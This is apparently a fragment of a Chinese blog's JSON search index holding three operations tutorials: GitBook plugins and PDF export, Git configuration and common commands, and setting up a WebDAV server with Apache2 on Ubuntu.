中加入配置如下即可：\n\n```\n{\n    \"plugins\": [ \"github\" ],\n    \"pluginsConfig\": {\n        \"github\": {\n            \"url\": \"https://github.com/your/repo\"\n        }\n    }\n}\n```\n\n然后在终端输入`gitbook install ./` 即可。\n如果要指定插件的版本可以使用 `plugin@0.3.1`，因为一些插件可能不会随着 GitBook 版本的升级而升级。\n\n## 导出pdf文件\n\n安装[calibre-ebook](https://calibre-ebook.com/)和`ebook-convert`：\n\n> npm install ebook-convert -g\n\n然后再执行转换\n\n- windows 下\n\n> gitbook pdf `[被转换目录]` `[转换后的文件名]`\n\n- linux下\n  linux下转换需要退回到上一层目录\n\n> gitbook pdf [被转换目录]","tags":["gitbook","入门教程"],"categories":["运维"]},{"title":"Git配置指南","url":"/20200101/9b4ae4eeeaca/","content":"\n## 安装\n\n> sudo apt-get install git git-core\n\n## 初始配置\n\n- 用户信息 配置个人的用户名称和电子邮件地址：\n\n> $ git config –global user.name “runoob”\n>\n> $ git config –global user.email test@runoob.com\n\n- 文本编辑器\n\n> $ git config –global core.editor vim\n\n- 差异分析工具\n\n> $ git config –global merge.tool vimdiff\n\n- 检查已有的配置信息\n\n> git config –list\n\n## 命令\n\n### git diff\n\n执行 git diff 来查看执行 git status 的结果的详细信息。git diff 命令显示已写入缓存与已修改但尚未写入缓存的改动的区别。\n\n- 尚未缓存的改动：git diff\n- 查看已缓存的改动： git diff –cached\n- 查看已缓存的与未缓存的所有改动：git diff HEAD\n- 显示摘要而非整个 diff：git diff –stat\n\n### Git log 查看提交历史\n\n在使用 Git 提交了若干更新之后，又或者克隆了某个项目，想回顾下提交历史，我们可以使用 git log 命令查看。\n针对我们前一章节的操作，使用 git log 命令列出历史提交记录如下：\n\n> $ git log\n\n***参数：\\***\n\n- `--oneline`选项来查看历史记录的简洁的版本。\n\n> $ git log –oneline\n\n- `--graph` 选项，查看历史中什么时候出现了分支、合并。以下为相同的命令，开启了拓扑图选项：\n\n> $ git log –oneline –graph\n\n- `--reverse`参数来逆向显示所有日志。\n\n> $ git log –reverse –oneline\n\n查找指定用户的提交日志可以使用命令：`git log --author` , 例如，比方说我们要找 Git 源码中 Linus 提交的部分：\n\n> $ git log –author=Linus –oneline -5\n\n如果你要指定日期，可以执行几个选项：–since 和 –before，但是你也可以用 –until 和 –after。\n例如，如果我要看 Git 项目中三周前且在四月十八日之后的所有提交，我可以执行这个（我还用了 –no-merges 选项以隐藏合并提交）：\n\n> $ git log –oneline –before={3.weeks.ago} –after={2010-04-18} –no-merges\n\n### Git tag 标签\n\n如果你达到一个重要的阶段，并希望永远记住那个特别的提交快照，你可以使用 git tag 给它打上标签。\n\n比如说，我们想为我们的 w3cschoolcc 项目发布一个”1.0″版本：\n\n> $ git tag -a v1.0\n\n选项：\n\n- -a 选项意为”创建一个带注解的标签”。不用 -a 选项也可以执行的，但它不会记录这标签是什么时候打的，谁打的，也不会让你添加个标签的注解。\n\n#### 追加标签\n\n如果我们忘了给某个提交打标签，又将它发布了，我们可以给它追加标签。例如，假设我们发布了提交 85fc7e7，但是那时候忘了给它打标签。 我们现在也可以：\n\n> $ git tag -a v0.9 85fc7e7\n\n#### 指定标签信息命令：\n\n> git tag -a -m “w3cschool.cc标签”\n\n#### PGP签名标签命令：\n\n> git tag -s -m “w3cschool.cc标签”\n\n### Git 远程仓库(Github)\n\n#### 添加远程库\n\n> git remote add [shortname] [url]\n\n由于本地Git仓库和GitHub仓库之间的传输是通过SSH加密的，所以我们需要配置验证信息：\n使用以下命令生成SSH Key：\n\n> $ ssh-keygen -t rsa -C “youremail@example.com”\n\n成功的话会在~/下生成.ssh文件夹，进去，打开 id_rsa.pub，复制里面的 key。\n回到 github 上，进入 Account => Settings（账户配置）。\n\n左边选择 SSH and GPG keys，然后点击 New SSH key 按钮,title 设置标题，可以随便填，粘贴在你电脑上生成的 key。\n\n- 查看当前的远程库\n\n> git remote\n\n- 配置上游分支\n\n> git push –set-upstream [repo] [branch]\n\n- 提取远程仓库\n\n1. 从远程仓库下载新分支与数据：\n\n> git fetch\n\n该命令执行完后需要执行git merge 远程分支到你所在的分支。\n\n2.从远端仓库提取数据并尝试合并到当前分支：\n\n> git pull\n\n#### 推送到远程仓库\n\n推送你的新分支与数据到某个远端仓库命令:\n\n> git push [alias] [branch]\n\n#### 删除远程仓库\n\n删除远程仓库你可以使用命令：\n\n> git remote rm [别名]","tags":["git"],"categories":["运维"]},{"title":"搭建一个webdav服务器","url":"/20200101/3c0c0d4f2c40/","content":"\n## 简介\n\nwebdav是“Web-based Distributed Authoring and Versioning”的简称。作为FTP的代替，在局域网内便捷地共享、传输文件。本文简单介绍在ubuntu/debian上搭建webdav服务器。\n\n## 安装\n\n1. 安装Apache2服务器\n\n```\n   sudo apt install apache2\n```\n\n1. 测试工具cadaver*: cadaver是一款命令行下的webdav工具\n\n```\n   sudo apt install cadaver\n```\n\n## 配置\n\n1. 启用相关模块\n\n```\n   sudo a2enmod dav_fs\n   //启用dav_fs时会自动启用dav模块\n   sudo a2enmod dav_lock\n```\n\n1. 重启 Apache2 服务:\n\n```\n   sudo service apache2 restart\n```\n\n1. 创建虚拟主机目录:\n\n```\n   mkdir /media/data\n   chown www-data:www-data /media/data\n```\n\n1. 创建用户:\n\n```\n   sudo htpasswd -c /media/me.dav sergget\n   // 这里会要求你设置密码，后面登录时会用到，用户名即为 sergget\n   sudo chown root:www-data /media/me.dav\n   sudo chmod 640 /media/me.dav\n```\n\n1. 配置虚拟主机:\n\n```\n   sudo vim /etc/apache2/sites-available/webdav.conf\n```\n\n在文件中插入以下内容并保存\n\n```\n   <VirtualHost *:80>\n           ServerAdmin webmaster@localhost\n           DocumentRoot /media/data/\n           <Directory /media/data/>\n                   Options Indexes MultiViews\n                   AllowOverride None\n                   Require all granted\n           </Directory>\n\n           Alias /webdav /media/data\n\n           <Location /webdav>\n              DAV On\n              AuthType Basic\n              AuthName \"webdav\"\n              AuthUserFile /media/me.dav\n              Require valid-user\n          </Location>\n   </VirtualHost>\n```\n\n到Apache2下链接配置文件：\n\n```\n   cd /etc/apache2/sites-enabled/\n   sudo ln -s ../sites-available/webdav.conf webdav.conf\n   sudo rm 000-default.conf\n```\n\n配置完成后重启apache2服务使配置生效\n\n```\n   sudo service apache2 restart\n```\n\n## 验证\n\n使用命令行 cadaver 进入登录\n\n```\ncadaver http://127.0.0.1/webdav/\n```","tags":["webdav","apache","Linux"],"categories":["运维"]}]